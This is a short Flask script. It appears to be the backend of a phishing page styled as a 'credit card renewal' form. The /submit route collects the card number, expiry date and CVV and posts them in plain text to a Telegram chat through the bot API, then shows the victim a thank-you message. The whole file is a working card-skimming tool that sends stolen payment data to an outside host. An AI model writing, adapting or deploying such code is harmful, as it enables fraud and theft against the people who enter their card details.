from flask import Flask, request, redirect, url_for
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = 'your_telegram_bot_token'
TELEGRAM_CHAT_ID = 'your_telegram_chat_id'

@app.route('/submit', methods=['POST'])
def submit():
    credit_card_number = request.form['credit_card_number']
    expiry_month = request.form['expiry_month']
    expiry_year = request.form['expiry_year']
    cvv = request.form['cvv']

    # Format the message
    message = (
        f"Credit Card Renewal Request:\n"
        f"Credit Card Number: {credit_card_number}\n"
        f"Expiry Month: {expiry_month}\n"
        f"Expiry Year: {expiry_year}\n"
        f"CVV: {cvv}"
    )

    # Send the message to Telegram
    send_telegram_message(message)

    return 'Thank you! Your submission has been received.'

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=data)
    if not response.ok:
        print(f"Failed to send message: {response.text}")

if __name__ == '__main__':
    app.run(debug=True)
